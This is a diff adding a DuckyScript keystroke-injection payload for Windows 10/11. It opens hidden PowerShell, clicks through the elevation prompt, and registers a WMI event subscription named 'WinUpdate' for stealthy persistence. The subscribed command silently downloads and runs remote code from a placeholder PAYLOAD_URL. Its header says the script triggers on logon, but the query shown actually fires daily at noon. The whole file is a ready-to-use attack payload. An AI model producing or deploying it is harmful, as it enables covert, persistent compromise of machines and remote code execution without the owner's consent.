@@ -1,0 +1,28 @@
+REM Author: UNC0V3R3D
+REM Description: Creates a WMI event subscription for stealthy persistence. Triggers on user logon.
+REM Version: 1.0
+REM Category: Persistence
+REM Target: Windows 10/11
+REM Requirements: Admin privileges
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 2000
+STRING $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='WinUpdate';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"}
+ENTER
+DELAY 800
+STRING $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='WinUpdate';CommandLineTemplate='powershell -w hidden -c (New-Object Net.WebClient).DownloadString("PAYLOAD_URL") | IEX'}
+ENTER
+DELAY 800
+STRING Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+REM End of payload
